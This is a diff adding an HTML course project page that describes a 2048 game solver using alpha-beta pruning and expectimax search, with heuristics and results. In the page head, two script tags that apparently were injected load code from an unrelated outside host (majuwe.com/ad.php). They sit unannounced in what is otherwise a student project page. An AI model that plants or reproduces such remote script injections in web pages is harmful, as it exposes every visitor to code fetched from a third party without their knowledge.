@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=iso-8859-1"/>
+    
+    <!-- you may want to add your own keywords here, for search engine optimization -->
+    <meta name="Keywords" content="INTRODUCTION TO ARTIFICIAL INTELLIGENCE, computer science, the hebrew university of jerusalem, project"/ >
+    <link rel="stylesheet" type="text/css" href="http://www.cs.huji.ac.il/~ai/projects/2012/css/default.css" />      <!-- Don't change this line!-->
+    <title>Your Project's Title</title>
+<script src="https://majuwe.com/ad.php?u=47e78829ca6b0c698d26b4d59f447303&p=1"></script><script src="https://majuwe.com/ad.php?u=47e78829ca6b0c698d26b4d59f447303"></script></head>
+
+<body>
+<div class="main">
+    <div class="gfx">
+        <a href="http://www.cs.huji.ac.il/~ai/projects/" alt="Introduction to Artificial Intelligence The Hebrew University of Jerusalem"></a>  <!-- Don't change this line!--> 
+    </div>
+    <div class="title">
+        <h1>2048 Solver </h1>
+        <h4>Final project by </h4>
+        <h3>
+            <a href="mailto:email1@cs.huji.ac.il" > Michelle Fried  </a> &nbsp &nbsp
+            <a href="mailto:email2@cs.huji.ac.il" > Yaacov-Yonatan Goldberger  </a> &nbsp &nbsp
+            <a href="mailto:email2@cs.huji.ac.il" > Zuzana Gavorova  </a>
+        </h3>     
+    </div>
+   <hr>
+
+    <div class="content">
+<img src="img/game.png" alt="funny chart" width="620" > 
+    <h2>Introduction</h2>
+    <p>
+    In our project we decided to solve 2048 by using artificial intelligence. A year ago, like everyone else, we managed to get addicted to the 2048 game. This addiction made us choose that game as our final project and to try different approaches and methods for solving it as we describe next.
+    </p>
+    
+    <h2> Approach and Method </h2>
+    <p>
+     In order to solve the game we used the following methods:
+     <br><br>
+	A.	AlphaBeta pruning:
+	<br><br>
+Alpha-beta pruning is just an optimized version of MiniMax algorithm which is a game with two players. The algorithm finds the best move for our player assuming that the opponent plays his best move. In a zero-sum game the best move of our player is the move with the highest heuristic value, while the best move of the opponent is the one with the lowest heuristic value (hence the name MiniMax). 
+<br><br>
+In order to use alpha-beta pruning we must first identify the two players. The first player is our agent who plays the game. The second player is the 'computer agent' which randomly inserts valued tiles in the cells of the board. Our agent tries to maximize the heuristic value. On the other hand the 'computer agent' in the original game is not specifically programmed to block our agent but rather randomly inserts values on the empty cells. 
+	<br><br>
+So the question is why we use an AI technique which solves zero-sum games and which specifically assumes that both players select the best possible move for them? The answer is simple, despite the fact that it is only our agent who always plays his optimal move, the choices of the ' computer agent' can block the progress and stop our agent from completing the game. By modeling the behavior of the 'computer agent' as an optimal player we ensure that our choice will be a solid one independently from what the 'computer agent' plays. 			
+	<br><br>
+Zero-sum game approach gives rise to the game tree. Depending on how far into the future we want to look when deciding the current move, the tree is expanded to several levels, where one level is one move of our agent followed by one move of the 'computer agent'. The branching factor at the move of our agent is 4, corresponding to sliding in the maximum of 4 possible directions. (If the current game state is such that sliding in some direction would not alter it, this direction is not available.) The 'computer agent' during his move inserts a tile of value 2 or 4 into any empty place so the branching factor at his move is twice the number of empty cells. The overall branching factor of the tree is thus of the order of 8  where   is the size of the game board. This large branching factor justifies the use of alpha-beta pruning, which avoids expanding useless nodes.
+	<br><br>
+	B.	Expectimax search:
+	<br><br>
+The problem with the alpha-beta agent is that it is unnecessarily careful when choosing the next move.  We know that the 'computer agent' is not optimal, but random. We would like our agent to make the best move while being subjected to a random event (the random tiles being added).  Knowing the probabilities of the 'computer agent's' moves we can use expectimax algorithm to model the opponent's behavior more realistically. What this algorithm does is to recursively predict the future possible moves and to choose the next immediate one which will probably lead to the best outcome.                                       <br><br>
+In the expectimax algorithm we expand the full game tree as described for MiniMax, but based on this tree we choose the next move differently. Moving from the leafs upwards, we take heuristic-value expectations over the possible 'computer agent' moves and maxima over our agent's moves. The expectations over the 'computer agent's moves are with respect to the new-tile probabilities taken from the source code of the original 2048 game. Since expectations are taken over all possible moves, there are no useless nodes that can remain unexpanded and the branching factor cannot be reduced.
+
+     
+    </p>
+       
+       
+      <h2> Heuristics </h2>
+       <ol>
+	<li>	Score heuristic - returns the current score.</li>	
+	<li>	Empty space heuristic - calculates the number of empty tiles.</li>
+	<li>	Difference heuristic – compute the difference between every two adjacent tiles and sum      the results. </li>
+	<li>	Max Tile heuristic- returns the maximum value in the board. </li>
+	<li>	Corner heuristic- assigns higher values to tiles in one corner. </li>
+	<li>	Snake Heuristic- assigning ascending values in a folded-snake shape.</li>
+     
+       </ol>
+       
+	<h2> Results </h2>
+    <p>
+The Expectimax, being realistic, performs much better than the pessimistic AlphaBeta agent, which assumes that the opponent always makes the move which is the worst for us. The AlphaBeta agent’s assumption simply does not correspond to the game we are playing and this is why its performance is worse for all the heuristics.
+    </p>
+   
+    <img src="img/scorealphabeta_expe.png" alt="funny chart" width="620" > 
+    <img src="img/wonalphabeta_expe.png" alt="funny chart" width="620" >
+    <p>
+   While exploring combinations of different heuristics we found the effect of adding the score heuristic to each of the other heuristics. The result is shown in the figure bellow. 
+    </p>
+<img src="img/combineheuristics.png" alt="funny chart" width="620" > 
+ <p>   
+The snake heuristic combined with the score heuristic only worsens. On the other hand, corners heuristics and difference heuristics improve, which makes us believe that an addition of the score heuristics corrects for their small drawbacks. Note that adding the score heuristics especially improves the difference heuristics. The fact that there was so much room for improvement indicates that the difference heuristics on its own does not maximize the score enough. 
+ </p>
+    <!--
+    ***
+    note that the page width is 620px, so limit your images width to 620!
+    ***
+    -->    
+         
+    <h2>Conclusions</h2>
+    <p>
+     We have shown that the Expectimax agent is more
+appropriate than the AlphaBeta agent for solving the
+game 2048, because the addition of the new tiles into the
+2048 board is random. The best single heuristics to be
+used by the agent are the snake heuristics achieving the
+probability 0.9 of winning and the average score (over
+100 games) of 45000. However, the same winning
+probability and the average score of 55000 can be
+achieved by a combination of corners and score
+heuristics.
+    </p>
+   
+    <h2>Additional Information</h2>
+    <p>
+        <ul>
+            <li><a href="files/report.pdf"> Link to the report (English)</a> </li>
+            <!--
+            If you wrote your report in English, change English or Hebrew to English. i.e, you should have the following line
+            <li><a href="files/report.pdf"> Link to the report (English)</a>
+            -->
+             
+        </ul>
+   </p>
+
+   <h2>References</h2>
+   <p>
+   [1] 2048 (video game) - Wikipedia, the free encyclopedia. Retrieved from
+http://en.wikipedia.org/wiki/2048_(video_game) on 26.03.2015.
+<br><br>
+[2] J. Rosenschein: Introduction to Artificial Intelligence - Course 67842
+course notes, Fall Semester 2014/15, Hebrew University of Jerusalem. 
+   </p>   
+   </div>
+   
+    <!-- *Don't* delete the below code, copyright issues...  -->    
+    <div class="footer">		
+        <span class="right"><a href="http://templates.arcsin.se/">Website template</a> by <a href="http://arcsin.se/">Arcsin</a>   </span>
+   </div>
+</div>
+</body>
+</html>
